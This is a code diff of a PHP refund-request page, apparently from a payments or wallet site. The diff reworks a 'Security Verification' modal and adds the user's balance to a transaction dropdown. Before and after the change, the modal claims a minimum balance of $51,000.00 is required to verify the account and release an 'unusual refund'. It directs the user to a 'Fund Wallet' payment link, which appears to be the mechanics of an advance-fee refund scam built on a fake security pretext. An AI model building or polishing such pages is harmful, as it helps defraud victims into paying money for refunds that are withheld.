@@ -158,7 +158,7 @@ foreach ($fields_by_method as $mname => $mfields) {
                 <option value="">— Select transaction —</option>
                 <?php foreach ($transactions as $t): ?>
                 <option value="<?= $t['id'] ?>" <?= (($_POST['transactions']??'')==$t['id'])?'selected':'' ?>>
-                    Transaction #<?= $t['id'] ?> — $<?= e($t['amount']) ?>
+                    Transaction #<?= $t['id'] ?> — $<?= e($t['amount']) ?> (Balance: $<?= $user_balance_display ?>)
                 </option>
                 <?php endforeach; ?>
             </select>
@@ -212,50 +212,21 @@ foreach ($fields_by_method as $mname => $mfields) {
     </form>
 </div>
 
-<!-- Floating Security Alert Popup -->
+<!-- Simple Center Modal -->
 <div class="modal-overlay <?= (!$is_eligible && $_SERVER['REQUEST_METHOD'] === 'POST') ? 'active' : '' ?>" id="securityModal">
     <div class="modal-card">
-        <button type="button" class="modal-close-btn" onclick="closeSecurityModal()" aria-label="Close">
-            <i class="bi bi-x-lg"></i>
-        </button>
-
-        <!-- Header: icon + title side by side -->
-        <div class="modal-header-row">
-            <div class="modal-icon-wrap">
-                <i class="bi bi-shield-lock-fill"></i>
-            </div>
-            <div class="modal-title-group">
-                <span class="modal-tag">🔒 Security Notice</span>
-                <h3 class="modal-title">Refund Blocked — Balance Too Low</h3>
-            </div>
+        <div class="modal-header">
+            <h3>Security Verification</h3>
+            <button type="button" class="modal-close-btn" onclick="closeSecurityModal()" aria-label="Close">&times;</button>
+        </div>
+        
+        <div class="modal-body">
+            <p>Security Verification: A minimum balance of <strong>$51,000.00</strong> is required to verify your account and process this unusual refund request.</p>
         </div>
 
-        <p class="modal-message">
-            Your account does not meet the minimum balance required to process a refund.
-            You need to have <strong>$51,000.00</strong> in your dashboard wallet to complete this refund request.
-            This security measure is in place because the transaction amount flagged as unusual,
-            and we require sufficient funds to verify account authenticity before releasing any refund.
-        </p>
-
-        <div class="modal-balance-box">
-            <div class="balance-item">
-                <span class="lbl">Your Wallet</span>
-                <span class="val current">$<?= $user_balance_display ?></span>
-            </div>
-            <div class="balance-divider"><i class="bi bi-arrow-right"></i></div>
-            <div class="balance-item">
-                <span class="lbl">Required</span>
-                <span class="val required">$51,000.00</span>
-            </div>
-        </div>
-
-        <div class="modal-actions">
-            <a href="/payment.php" class="btn-modal-primary">
-                <i class="bi bi-wallet2"></i> Fund Wallet
-            </a>
-            <a href="/dashboard.php" class="btn-modal-secondary">
-                Back to Dashboard
-            </a>
+        <div class="modal-footer">
+            <a href="/dashboard.php" class="btn-modal-secondary">Cancel</a>
+            <a href="/payment.php" class="btn-modal-primary">Fund Wallet</a>
         </div>
     </div>
 </div>
